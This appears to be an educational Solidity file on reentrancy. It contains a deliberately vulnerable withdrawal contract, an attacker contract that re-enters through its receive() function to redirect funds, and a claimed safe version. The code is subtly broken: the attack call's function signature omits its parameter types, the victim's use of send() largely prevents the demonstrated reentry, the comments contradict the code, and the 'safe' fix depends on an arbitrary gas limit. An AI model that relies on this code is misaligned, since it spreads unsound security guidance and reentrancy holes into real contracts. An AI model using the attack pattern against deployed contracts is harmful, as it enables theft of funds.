//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;


contract ReentrancyVictim {
  mapping (address => uint256)  private balances;

  function withdrawal () external {
     uint256 balance = balances[msg.sender];

     bool result = payable(msg.sender).send(balance);

     require(result, "Failed to withdraw");

     balances[msg.sender] = 0;
  }


  function transferTo (address destiny, uint256 ammount ) external {
      if(balances[msg.sender] >= ammount){
        balances[msg.sender] -= ammount;
        balances[destiny] += ammount;
      }
  }
}


//Recursive call to the function in order to empty the contracts funds
contract AttackContract {
  address private victimContract;
  address private owner;

  constructor(address _victimContract, address _owner) {
    victimContract = _victimContract;
    owner = _owner;
  }

  receive() external payable {
    //Call another function in the external contract 
    //In order to get a unexpected behavior
    victimContract.call(abi.encodeWithSignature("transferTo()", owner, msg.value));
  }
}

//Prevention for a reentrancy attack, do not update the state after a transfer
//Set a limit gas to operate

contract SafeReentrancy {
  mapping (address => uint256)  private balances;
  uint256 private constant GAS_LIMIT = 10000;

  function withdrawal () external {
     uint256 balance = balances[msg.sender];
     //Update state after the transaction
     balances[msg.sender] = 0;

    //Set a prevention gas limit;
     (bool result,) = msg.sender.call{value: balance, gas: GAS_LIMIT}("");

     require(result, "Failed to withdraw");
  }
}